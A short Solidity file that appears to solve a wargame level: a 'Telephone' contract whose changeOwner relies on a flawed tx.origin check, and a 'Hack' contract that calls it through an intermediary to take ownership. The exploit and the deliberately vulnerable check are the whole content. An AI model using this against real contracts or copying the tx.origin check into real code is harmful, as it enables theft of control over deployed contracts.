// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack{
    Telephone private telephone;
    constructor(address _target){
        telephone = Telephone(_target);
    }

    function changeOwner(address _owner) public{
        telephone.changeOwner(_owner);
    }
}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}